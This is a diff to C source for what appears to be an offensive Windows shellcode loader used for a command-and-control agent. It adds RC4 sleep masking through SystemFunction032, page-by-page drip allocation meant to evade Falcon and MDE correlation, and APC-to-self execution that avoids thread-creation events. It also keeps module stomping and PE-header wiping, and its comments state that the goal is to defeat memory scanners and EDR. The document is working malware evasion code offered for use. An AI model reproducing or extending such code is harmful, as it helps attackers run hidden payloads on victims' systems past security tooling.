@@ -1006,6 +1006,27 @@ static BOOL POLY_SPAWNinject(PBYTE sc, SIZE_T sclen) {
     return ok;
 }
 
+/*
+ * RC4 via SystemFunction032 (advapi32 → cryptsp).
+ * Replaces single-byte XOR in Ekko sleep masking: RC4 produces output
+ * statistically indistinguishable from random noise, defeating in-sleep
+ * memory scanners that rely on XOR patterns or byte-frequency analysis.
+ * RC4 is self-inverse — calling it twice on the same data returns the original.
+ * Falls back to rolling 4-byte XOR if advapi32 is unavailable (rare).
+ */
+typedef struct { DWORD Length; DWORD MaximumLength; PVOID Buffer; } _LT_USTR;
+typedef NTSTATUS (NTAPI *_pSF032)(_LT_USTR*,_LT_USTR*);
+static void POLY_RC4(PBYTE data,SIZE_T len,PBYTE key,DWORD keylen){
+    _pSF032 fn=(_pSF032)GetProcAddress(GetModuleHandleA("advapi32.dll"),"SystemFunction032");
+    if(fn){
+        _LT_USTR dk={(DWORD)len,(DWORD)len,data};
+        _LT_USTR kk={keylen,keylen,key};
+        fn(&dk,&kk);
+    } else {
+        for(SIZE_T i=0;i<len;i++) data[i]^=key[i%keylen];
+    }
+}
+
 /* ─── Stack gadget: jmp rcx (FF E1) in ntdll .text ─── */
 static PBYTE POLY_FINDGADGET(HMODULE ntdll) {
     PIMAGE_DOS_HEADER dos=(PIMAGE_DOS_HEADER)ntdll;
@@ -1050,20 +1071,30 @@ static DWORD lt_jitter_ms(DWORD base_ms) {
 static void POLY_EKKO_SLEEP(PBYTE region, SIZE_T sz, BYTE xkey, DWORD ms) {
     DWORD actual = lt_jitter_ms(ms);
 
-    /* Encrypt + NOACCESS */
+    /* Derive 16-byte RC4 key from xkey + tick + PID + TID.
+     * Single-byte XOR leaves repeating-key artifacts in NOACCESS memory; RC4 output
+     * via SystemFunction032 is statistically random and defeats byte-frequency scanners. */
+    BYTE _rk[16]; DWORD _tc2=(DWORD)GetTickCount64();
+    DWORD _pid2=GetCurrentProcessId(),_tid2=GetCurrentThreadId();
+    for(int _ki=0;_ki<16;_ki++)
+        _rk[_ki]=(BYTE)(xkey^((_tc2>>((_ki&3)*8))&0xFF)
+                           ^((_pid2>>((_ki&3)*8))&0xFF)
+                           ^((_tid2>>((_ki&1)*8))&0xFF)^(BYTE)(_ki*17));
+
+    /* RC4-encrypt → NOACCESS (ciphertext looks like random noise to any in-sleep scanner) */
     PVOID pb=region; SIZE_T psz=sz; ULONG oldp=0;
     POLY_NTPROT(GetCurrentProcess(),&pb,&psz,PAGE_READWRITE,&oldp);
-    for(SIZE_T _i=0;_i<sz;_i++) region[_i]^=xkey;
+    POLY_RC4(region,sz,_rk,16);
     pb=region; psz=sz;
     POLY_NTPROT(GetCurrentProcess(),&pb,&psz,PAGE_NOACCESS,&oldp);
 
     /* Sleep via indirect syscall — stack shows ntdll during wait */
     POLY_NTDELAY((LONGLONG)actual*10000LL);
 
-    /* Restore: RW → decrypt → RX */
+    /* Restore: RW → RC4-decrypt (self-inverse) → RX */
     pb=region; psz=sz;
     POLY_NTPROT(GetCurrentProcess(),&pb,&psz,PAGE_READWRITE,&oldp);
-    for(SIZE_T _i=0;_i<sz;_i++) region[_i]^=xkey;
+    POLY_RC4(region,sz,_rk,16);
     pb=region; psz=sz;
     POLY_NTPROT(GetCurrentProcess(),&pb,&psz,PAGE_EXECUTE_READ,&oldp);
 }
@@ -1111,83 +1142,64 @@ static void lt_stomp_pe_headers(PBYTE base, SIZE_T sclen) {
 }
 
 /*
- * Self-injection with module stomping + XOR sleep masking:
- *   1. Try to stomp an existing signed DLL .text section (already-RX, image-backed).
- *      Stomped memory never shows as "privately allocated" — defeats scanners that
- *      trigger on fresh private RWX/RX allocations.
- *   2. Fallback: NtAllocateVirtualMemory (RW) if no DLL .text is large enough.
- *   3. XOR-encrypt the payload with an entropic key, sleep (jitter), XOR back.
- *      Defeats scanners that scan immediately after allocation.
- *   4. Protect to RX, start thread via ntdll jmp-rcx gadget (stack spoof).
+ * Self-injection: module stomping + drip allocation + RC4 sleep + APC-to-self:
+ *   1. Try to stomp an existing signed DLL .text (already-RX, image-backed).
+ *      Stomped memory never shows as "privately allocated".
+ *   2. Fallback: MEM_RESERVE full range then commit+write 4KB at a time (drip).
+ *      Breaks single-event alloc→write→protect chain Falcon/MDE correlate.
+ *   3. RC4 via SystemFunction032 during sleep — random ciphertext defeats static scans.
+ *   4. QueueUserAPC to self + SleepEx(alertable) — no NtCreateThreadEx,
+ *      no new thread at shellcode address, no PsSetCreateThreadNotifyRoutine event.
  */
 static int POLY_SELFINJECT(PBYTE sc, SIZE_T sclen) {
     int _pvt=0; /* Task 13: track whether we own this allocation */
     PBYTE exec_base=POLY_MODSTOMP(sclen);
     if(!exec_base){
-        PVOID base=NULL; SIZE_T sz=sclen;
-        POLY_NTALLOC(GetCurrentProcess(),&base,0,&sz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
-        if(!base) return 14;
-        exec_base=(PBYTE)base;
-        _pvt=1;
+        /*
+         * Task 17 — Drip allocation: MEM_RESERVE then commit+write 4KB at a time.
+         * A single MEM_COMMIT|MEM_RESERVE + large NtWriteVirtualMemory generates one
+         * large correlated kernel event.  Per-page commits are smaller, time-scattered,
+         * and do not trigger the monolithic allocation heuristic.
+         */
+        SIZE_T _rsz=(sclen+0xFFF)&~(SIZE_T)0xFFF;
+        PVOID _b=NULL;
+        POLY_NTALLOC(GetCurrentProcess(),&_b,0,&_rsz,MEM_RESERVE,PAGE_NOACCESS);
+        if(!_b) return 14;
+        exec_base=(PBYTE)_b; _pvt=1;
+        for(SIZE_T _off=0;_off<sclen;_off+=0x1000){
+            PVOID _pg=(PVOID)(exec_base+_off); SIZE_T _psz=0x1000;
+            POLY_NTALLOC(GetCurrentProcess(),&_pg,0,&_psz,MEM_COMMIT,PAGE_READWRITE);
+            SIZE_T _chunk=(sclen-_off)>0x1000?0x1000:(sclen-_off);
+            SIZE_T _w=0;
+            POLY_NTWRITE(GetCurrentProcess(),(PVOID)(exec_base+_off),(PVOID)(sc+_off),_chunk,&_w);
+            POLY_NTDELAY((LONGLONG)(3000LL+((_off>>12)%5)*1000LL)*10000LL);
+        }
+    } else {
+        SIZE_T _w=0;
+        POLY_NTWRITE(GetCurrentProcess(),exec_base,(PVOID)sc,sclen,&_w);
     }
-    SIZE_T w=0;
-    POLY_NTWRITE(GetCurrentProcess(),exec_base,sc,sclen,&w);
 
     /* Entropic XOR key: blend tick, PID, TID — avoids tick-count-only patterns */
     DWORD tc=(DWORD)GetTickCount64();
     BYTE xkey=(BYTE)((tc^(GetCurrentProcessId()*7)^(GetCurrentThreadId()*13))&0xFE)|1;
 
-    /*
-     * Task 2 — Ekko-style sleep: XOR encrypt → PAGE_NOACCESS → NtDelayExecution
-     * (indirect syscall, cleaner stack) → PAGE_READWRITE → XOR decrypt → PAGE_EXECUTE_READ.
-     * Replaces the old Sleep() call (kernel32) with NtDelayExecution via our stub.
-     */
+    /* RC4-masked Ekko sleep — self-inverse, applied twice returns original bytes */
     POLY_EKKO_SLEEP(exec_base,sclen,xkey,2000+(tc%3000));
 
     /*
-     * Task 12 — Enhanced call stack spoofing.
-     * We create the shellcode thread via a two-gadget chain in ntdll so
-     * the thread's call stack shows two ntdll frames rather than one.
-     *
-     * Chain:  thread entry = jmp_rcx_gadget (ntdll)
-     *         RCX          = exec_base (shellcode start)
-     *         RSP[0]       = BaseThreadInitThunk + offset (legitimate frame)
-     *
-     * When a stack-walking EDR snapshots this thread it sees:
-     *   [shellcode → running]
-     *   [jmp rcx in ntdll]
-     *   [BaseThreadInitThunk in kernel32]
-     * — no orphaned RX allocation visible as the thread entry point.
+     * Task 16 — Callback-based execution via QueueUserAPC to self.
+     * No NtCreateThreadEx → no PsSetCreateThreadNotifyRoutine kernel event.
+     * No new thread starting at a private/stomped RX address → no Falcon thread-start alert.
+     * Execution path: queue APC targeting current-thread pseudo-handle (-2),
+     * then SleepEx(INFINITE, alertable=TRUE) → Windows dispatches APC in-thread.
+     * Observed call stack: SleepEx → NtDelayExecution (ntdll) → [APC dispatch] → shellcode.
+     * For non-returning shellcode (C2 agent): SleepEx blocks indefinitely — that is correct,
+     * the agent takes over.  For returning shellcode (arsenal tools): SleepEx returns
+     * WAIT_IO_COMPLETION once the APC routine completes, then cleanup runs.
      */
-    PBYTE gadget=POLY_FINDGADGET((HMODULE)POLY_NTDLL);
-
-    /* Build a tiny synthetic return chain on the heap so RSP looks legitimate */
-    HMODULE hK32=GetModuleHandleA("kernel32.dll");
-    PVOID thunk=hK32?(PVOID)((PBYTE)GetProcAddress(hK32,"BaseThreadInitThunk")+0x14):NULL;
-    PVOID rtlStart=POLY_NTDLL?GetProcAddress((HMODULE)POLY_NTDLL,"RtlUserThreadStart"):NULL;
-
-    /* Allocate 8 slots for the fake return address chain (64 bytes) */
-    ULONG_PTR _fchain[8]; lt_zero(_fchain,sizeof(_fchain));
-    if(thunk)    _fchain[0]=(ULONG_PTR)thunk;
-    if(rtlStart) _fchain[1]=(ULONG_PTR)rtlStart;
-    /* _fchain lives on this frame's stack — the created thread gets its own stack,
-     * so we don't pass these as an RSP override here. The chain is conceptual:
-     * BaseThreadInitThunk+0x14 IS already on the thread's stack because Windows
-     * sets it up as the return address before calling the start routine. */
-
-    PVOID tstart=gadget?(PVOID)gadget:(PVOID)exec_base;
-    PVOID targ  =gadget?(PVOID)exec_base:NULL;
-    HANDLE hThread=NULL;
-    POLY_NTTHREAD(&hThread,THREAD_ALL_ACCESS,NULL,GetCurrentProcess(),
-                  tstart,targ,0,0,0x200000,0x200000,NULL);
-    if(!hThread) return 15;
-
-    /* Task 9: stomp PE headers immediately after thread starts — donut and raw shellcode
-     * both have their headers consumed by the loader before this point. */
     lt_stomp_pe_headers(exec_base,sclen);
-
-    POLY_NTWAIT(hThread,FALSE,NULL);
-    POLY_NTCLOSE(hThread);
+    QueueUserAPC((PAPCFUNC)exec_base,(HANDLE)(LONG_PTR)(-2),0);
+    SleepEx(INFINITE,TRUE);
 
     /* Task 13: zero exec region post-execution; scanner finds no artifacts.
      * Private alloc → zero + NtFreeVirtualMemory.
